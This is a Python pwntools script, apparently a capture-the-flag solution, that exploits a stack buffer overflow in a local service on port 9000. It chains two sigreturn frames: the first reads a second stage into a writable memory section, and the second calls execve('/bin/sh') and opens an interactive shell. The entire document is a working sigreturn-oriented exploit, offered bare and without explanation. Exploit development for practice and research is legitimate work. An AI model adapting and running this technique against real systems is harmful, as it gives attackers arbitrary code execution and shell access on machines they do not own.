from pwn import *

context.os = 'linux'
context.arch = 'amd64'

r = remote('localhost', 9000)
r.recvuntil("n) ")

POP_RAX_SYSCALL = p64(0x40117e)
SIGRETURN = p64(15)
SYSCALL_RET = 0x40117f
RW_SECTION = 0x404000

payload  = b'A'*112 + b'B'*8
payload += POP_RAX_SYSCALL
payload += SIGRETURN

frame = SigreturnFrame()
frame.rax = 0                 # read
frame.rsp = RW_SECTION+8
frame.rbp = RW_SECTION+128
frame.rdi = 0                 # stdin
frame.rsi = RW_SECTION
frame.rdx = 1024              # num bytes to read
frame.rip = SYSCALL_RET

payload += bytes(frame)
r.sendline(payload)

sleep(1)

payload  = b"/bin/sh\x00"
payload += POP_RAX_SYSCALL * 17
payload += SIGRETURN

frame = SigreturnFrame()
frame.rax = 59                # execve
frame.rdi = RW_SECTION
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL_RET

payload += bytes(frame)
r.sendline(payload)
r.interactive()
